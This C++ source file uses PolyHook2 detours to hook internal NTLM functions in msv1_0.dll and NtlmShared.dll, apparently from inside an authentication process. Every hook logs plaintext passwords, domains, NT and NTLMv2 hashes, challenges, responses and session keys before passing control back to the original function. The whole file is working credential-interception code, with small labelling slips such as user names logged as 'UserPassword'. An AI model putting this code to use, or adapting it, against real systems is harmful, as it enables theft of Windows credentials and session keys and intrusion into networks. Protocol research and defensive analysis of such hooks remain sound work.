//
// Created by Archer on 4/16/2021.
//

#include <vector>

#include <polyhook2/CapstoneDisassembler.hpp>
#include <polyhook2/Detour/x64Detour.hpp>

#include "hooks.hpp"


// Base of mvs1_0.dll in process's address space
//
static uint64_t msv_base;

// Base of NtlmShared.dll in process's address space
//
static uint64_t ntlmshared_base;

// Global instance of Disassembler
//
static PLH::CapstoneDisassembler* dis;

// List of hooks
//
static std::vector<PLH::Detour*> hooks;

uint64_t HookLM20GetNtlm3ChallengeResponseTemp;
uint64_t HookMsvpCalculateNtlm3OwfTemp;
uint64_t HookMsvpNtlm3ResponseTemp;
uint64_t HookSsprMakeSessionKeyTemp;

// Helpers
//
std::string hexlify( const uint8_t* buffer, size_t size )
{
    std::ostringstream ret;
    for ( int i = 0; i < size; i++ )
        ret << std::hex << std::setfill('0') << std::setw(2) << (int)buffer[i];
    return ret.str();
}

std::string UnicodeToString( PUNICODE_STRING buffer )
{
    std::string out;
    for ( int i = 0; i < buffer->Length; i++ )
    {
        auto c = (char)buffer->Buffer[ i ];
        if ( c == 0 ) break;
        out += c;
    }
    return out;
}


NOINLINE DWORD FnLM20GetNtlm3ChallengeResponse (
        void* a1,
        void* a2 ,
        PUNICODE_STRING UserPassword,
        PUNICODE_STRING Domain,
        PUNICODE_STRING UString3,
        void* a6,
        void* a7,
        PPMSV1_0_NTLM3_RESPONSE NTLM3Response,
        PMSV1_0_LM3_RESPONSE LM3Response,
        PUSER_SESSION_KEY SessionKey,
        void* a11 )
{
    auto log = get_logger();
    log->log( "[*] Called LM20GetNtlm3ChallengeResponse\n" );
    log->log( "\tUserPassword: %s\n", UnicodeToString( UserPassword ).c_str() );
    log->log( "\tDomain: %s\n", UnicodeToString( Domain ).c_str() );

    // Call function
    auto ret =  PLH::FnCast( HookLM20GetNtlm3ChallengeResponseTemp, ( LM20GetNtlm3ChallengeResponseTy )( msv_base + LM20GetNtlm3ChallengeResponseRva ) )( a1, a2, UserPassword, Domain, UString3, a6, a7, NTLM3Response, LM3Response, SessionKey, a11 );

    log->log( "\tSessionKey: %s\n", hexlify( SessionKey->Data, MSV1_0_USER_SESSION_KEY_LENGTH ).c_str() );
    // Log LM Response
    log->log( "\tLM Response:\n" );
    log->log( "\t\tClientChallenge: %s\n", hexlify( LM3Response->ChallengeFromClient, MSV1_0_CHALLENGE_LENGTH ).c_str() );
    log->log( "\t\tResponse: %s\n", hexlify( LM3Response->Response, MSV1_0_NTLM3_RESPONSE_LENGTH ).c_str() );
    // Log NTLM Response
    log->log( "\tNTLM Response:\n" );
    log->log( "\t\tClientChallenge: %s\n", hexlify( ( *NTLM3Response )->ChallengeFromClient, MSV1_0_CHALLENGE_LENGTH ).c_str() );
    log->log( "\t\tTimeStamp: 0x%llx\n", ( *NTLM3Response )->TimeStamp );
    log->log( "\t\tResponse: %s\n", hexlify( ( *NTLM3Response )->Response, MSV1_0_NTLM3_RESPONSE_LENGTH ).c_str() );
    log->log( "[*] Return LM20GetNtlm3ChallengeResponse\n" );
    return ret;
}

NOINLINE PVOID FnMsvpCalculateNtlm3Owf (
        PUCHAR           pNtOwfPassword,
        PUNICODE_STRING  pUserName,
        PUNICODE_STRING  pLogonDomainName,
        PUCHAR           Ntlm3Owf
)
{
    auto log = get_logger();
    log->log( "[*] Called MsvpCalculateNtlm3Owf\n" );
    log->log( "\tNTLM Hash: %s\n", hexlify( pNtOwfPassword, 0x10 ).c_str() );
    log->log( "\tUserPassword: %s\n", UnicodeToString( pUserName ).c_str() );
    log->log( "\tDomain: %s\n", UnicodeToString( pLogonDomainName ).c_str() );

    // Call function
    auto ret = PLH::FnCast( HookMsvpCalculateNtlm3OwfTemp, ( MsvpCalculateNtlm3OwfTy )( ntlmshared_base + MsvpCalculateNtlm3OwfRva ) )( pNtOwfPassword, pUserName, pLogonDomainName, Ntlm3Owf );

    log->log( "\tNTLMv2 Hash: %s\n", hexlify( Ntlm3Owf, 0x10 ).c_str() );
    log->log( "[*] Return MsvpCalculateNtlm3Owf\n" );
    return ret;
}

PVOID FnMsvpNtlm3Response (
        PUCHAR                   pNtOwfPassword,
        PUNICODE_STRING          pUserName,
        PUNICODE_STRING          pLogonDomainName,
        ULONG                    ServerNameLength,
        PUCHAR                   ChallengeToClient,
        PMSV1_0_NTLM3_RESPONSE   pNtlm3Response,
        PUCHAR                   Response,
        PUSER_SESSION_KEY        UserSessionKey,
        PUSER_SESSION_KEY        LmSessionKey
)
{
    auto log = get_logger();
    log->log( "[*] Called MsvpNtlm3Response\n" );
    log->log( "\tNTLM Hash: %s\n", hexlify( pNtOwfPassword, 0x10).c_str() );
    log->log( "\tUserPassword: %s\n", UnicodeToString( pUserName ).c_str() );
    log->log( "\tDomain: %s\n", UnicodeToString( pLogonDomainName ).c_str() );
    log->log( "\tServerChallenge: %s\n", hexlify( ChallengeToClient, 8 ).c_str() );
    // Call function
    auto ret = PLH::FnCast( HookMsvpNtlm3ResponseTemp, ( MsvpNtlm3ResponseTy )( ntlmshared_base + MsvpNtlm3ResponseRva ))( pNtOwfPassword, pUserName, pLogonDomainName, ServerNameLength, ChallengeToClient, pNtlm3Response, Response, UserSessionKey, LmSessionKey );

    log->log( "\tUserSessionKey: %s\n", hexlify( UserSessionKey->Data, 16 ).c_str() );
    log->log( "\tLmSessionKey: %s\n", hexlify( LmSessionKey->Data, 16 ).c_str() );
    log->log( "\tResponse: %s\n", hexlify( Response, 0x10 ).c_str() );
    log->log( "[*] Return MsvpNtlm3Response\n" );
    return ret;
}

DWORD FnSsprMakeSessionKey (
        PUCHAR          Context,
        PUNICODE_STRING LmChallengeResponse,
        PUCHAR          NtUserSessionKey,
        PUCHAR          LanmanSessionKey,
        PUNICODE_STRING DatagramSessionKey
)
{
    auto log = get_logger();
    log->log( "[*] Called SsprMakeSessionKey\n" );
    log->log( "\tUserSessionKey: %s\n", hexlify( NtUserSessionKey, 0x10 ).c_str() );
    log->log( "\tLanmanSessionKey: %s\n", hexlify( LanmanSessionKey, 8 ).c_str() );
    log->log( "\tDatagramSessionKey before call: %s\n", DatagramSessionKey == nullptr ? "NULL" : hexlify(
            reinterpret_cast<const uint8_t *>(DatagramSessionKey->Buffer), 0x10 ).c_str() );
    log->log( "\tContextSessionKey before call: %s\n", hexlify( Context + 104, 0x10 ).c_str() );

    // Call function
    auto ret = PLH::FnCast( HookSsprMakeSessionKeyTemp, ( SsprMakeSessionKeyTy )( msv_base + SsprMakeSessionKeyRva ) )( Context, LmChallengeResponse, NtUserSessionKey, LanmanSessionKey, DatagramSessionKey );

    log->log( "\tDatagramSessionKey after call: %s\n", DatagramSessionKey == nullptr ? "NULL" : hexlify(
            reinterpret_cast<const uint8_t *>(DatagramSessionKey->Buffer), 0x10 ).c_str() );
    log->log( "\tContextSessionKey after call: %s\n", hexlify( Context + 104, 0x10 ).c_str() );
    log->log( "[*] Return SsprMakeSessionKey\n" );
    return ret;
}

std::vector<std::tuple<uint64_t*, uint64_t, void*, uint64_t*>> targets = {
        { &msv_base,         LM20GetNtlm3ChallengeResponseRva,   FnLM20GetNtlm3ChallengeResponse,    &HookLM20GetNtlm3ChallengeResponseTemp },
        { &ntlmshared_base,  MsvpCalculateNtlm3OwfRva,           FnMsvpCalculateNtlm3Owf,            &HookMsvpCalculateNtlm3OwfTemp },
        { &ntlmshared_base,  MsvpNtlm3ResponseRva,               FnMsvpNtlm3Response,                &HookMsvpNtlm3ResponseTemp },
        { &msv_base,         SsprMakeSessionKeyRva,              FnSsprMakeSessionKey,               &HookSsprMakeSessionKeyTemp }
};


int initialize_hooks()
{
    auto log = get_logger();
    // Initialize disassembler
    dis = new PLH::CapstoneDisassembler( PLH::Mode::x64 );
    // Find msv1_0.dll
    msv_base = reinterpret_cast<uint64_t>( GetModuleHandleA( "msv1_0.dll" ) );
    // Find NtlmShared.dll
    ntlmshared_base = reinterpret_cast<uint64_t>( GetModuleHandleA( "NtlmShared.dll" ) );
    if ( !msv_base || !ntlmshared_base )
        return -1;

    log->log( "[+] 0x%016llx\tmsv1_0.dll\n", msv_base );
    log->log( "[+] 0x%016llx\tNtlmShared.dll\n", ntlmshared_base );

    for ( auto& target : targets )
    {
        auto address = *std::get<0>( target ) + std::get<1>( target );
        auto fn_callback = std::get<2>( target );
        auto temp = std::get<3>( target );
        log->log( "[*] Hooking 0x%016llx - 0x%016llx - 0x%016llx\n", address, fn_callback, temp );

        auto t = new PLH::x64Detour( (char*)address, (char*)fn_callback, temp, *dis );
        t->hook();
        hooks.push_back( t );
    }

    return 0;
}

void disable_hooks()
{
    for ( auto& hook : hooks )
        delete hook;
    delete dis;
}
